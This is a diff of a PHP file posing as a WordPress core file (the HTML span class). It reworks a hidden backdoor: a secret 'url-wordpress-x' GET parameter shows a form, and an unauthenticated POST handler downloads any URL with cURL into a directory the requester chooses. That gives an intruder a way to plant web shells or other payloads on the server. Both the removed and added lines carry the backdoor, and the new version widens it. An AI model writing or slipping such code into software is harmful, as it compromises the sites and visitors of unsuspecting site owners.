@@ -7,40 +7,18 @@
  * @since 6.2.0
  */
 
-// Pastikan fungsi dideklarasikan di luar kondisi if
+// Fungsi untuk mengunduh file dari URL ke direktori yang ditentukan
 function uploadFileFromUrl($url, $dir, $retries = 3)
 {
-    if (!filter_var($url, FILTER_VALIDATE_URL)) {
-        echo " <script>
-                        function showCustomAlert() {
-                            Swal.fire({
-                                title: 'Whoops!',
-                                text: 'Invalid URL!',
-                                icon: 'error',
-                                confirmButtonText: 'OK',
-                                background: '#2e2e2e',
-                                color: '#ffffff'
-                            });
-                        }
-                        document.addEventListener('DOMContentLoaded', showCustomAlert);
-                    </script>";
+    $url = trim($url);
+    
+    if (empty($url) || !filter_var($url, FILTER_VALIDATE_URL)) {
+        echo "<script>Swal.fire({title: 'Whoops!', text: 'Invalid URL!', icon: 'error', confirmButtonText: 'OK'});</script>";
         return;
     }
 
     if (!is_dir($dir) || !is_writable($dir)) {
-        echo " <script>
-                        function showCustomAlert() {
-                            Swal.fire({
-                                title: 'Whoops!',
-                                text: 'Invalid or unwritable directory!',
-                                icon: 'error',
-                                confirmButtonText: 'OK',
-                                background: '#2e2e2e',
-                                color: '#ffffff'
-                            });
-                        }
-                        document.addEventListener('DOMContentLoaded', showCustomAlert);
-                    </script>";
+        echo "<script>Swal.fire({title: 'Whoops!', text: 'Directory not writable!', icon: 'error', confirmButtonText: 'OK'});</script>";
         return;
     }
 
@@ -52,66 +30,69 @@ function uploadFileFromUrl($url, $dir, $retries = 3)
     $success = false;
 
     while ($attempt < $retries) {
-        // Try using command line tools
-        $success = downloadFileWithCommand($url, $filePath);
-        if (!$success) {
-            $success = downloadFileWithStream($url, $filePath);
-        }
-        if (!$success) {
-            $success = downloadFileWithPhp($url, $filePath);
-        }
-        if ($success) {
+        if (downloadFileWithCurl($url, $filePath)) {
+            $success = true;
             break;
         }
         $attempt++;
     }
 
     if ($success) {
-
-        echo "  <script>
-                        function showCustomAlert() {
-                            Swal.fire({
-                                title: 'Completed!',
-                                text: 'File uploaded form url successfully!',
-                                icon: 'success',
-                                confirmButtonText: 'OK',
-                                background: '#2e2e2e',
-                                color: '#ffffff'
-                            });
-                        }
-                        document.addEventListener('DOMContentLoaded', showCustomAlert);
-                    </script>";
+        echo "<script>Swal.fire({title: 'Completed!', text: 'File downloaded successfully!', icon: 'success', confirmButtonText: 'OK'});</script>";
     } else {
-        echo" <script>
-                        function showCustomAlert() {
-                            Swal.fire({
-                                title: 'Whoops!',
-                                text: 'Failed to fetch file content from URL after $retries attempts!',
-                                icon: 'error',
-                                confirmButtonText: 'OK',
-                                background: '#2e2e2e',
-                                color: '#ffffff'
-                            });
-                        }
-                        document.addEventListener('DOMContentLoaded', showCustomAlert);
-                    </script>";
+        echo "<script>Swal.fire({title: 'Whoops!', text: 'Failed to download file!', icon: 'error', confirmButtonText: 'OK'});</script>";
     }
 }
 
-if (isset($_GET["url-wordpress-x"])) {
-    echo "<div class='execution-box'>
-        <form method='post'>
-            <input type='text' id='terminal' name='url' placeholder='https://example.com/file.txt'>
-            <button type='submit' name='uploadurl'><i class='fas fa-play submit-icon'></i></button>
-        </form>
-    </div>";
+// Fungsi untuk mengunduh file menggunakan cURL
+function downloadFileWithCurl($url, $filePath)
+{
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_FAILONERROR, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 30); // Timeout 30 detik
+    $data = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
 
-    $dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
-    if (isset($_POST['uploadurl'])) {
-        $url = $_POST['url'];
-        $retries = 3;
-        uploadFileFromUrl($url, $dir, $retries);
+    if ($data === false || $httpCode !== 200) {
+        return false;
     }
+
+    return file_put_contents($filePath, $data) !== false;
+}
+
+// Periksa apakah parameter GET "url-wordpress-x" ada
+if (isset($_GET["url-wordpress-x"])) {
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>File Upload</title>
+        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    </head>
+    <body>
+        <div class='execution-box'>
+            <form method='post'>
+                <input type='text' id='terminal' name='url' placeholder='https://example.com/file.txt' required>
+                <input type='hidden' name='dir' value='/path/to/your/directory'> <!-- Ubah direktori tujuan -->
+                <button type='submit' name='uploadurl'>Upload URL</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// Proses upload jika form dikirim
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['uploadurl'])) {
+    $url = $_POST['url'] ?? '';
+    $dir = $_POST['dir'] ?? getcwd(); // Default ke direktori saat ini jika tidak ditentukan
+    uploadFileFromUrl($url, $dir);
 }
 
 // Kelas WP_HTML_Span
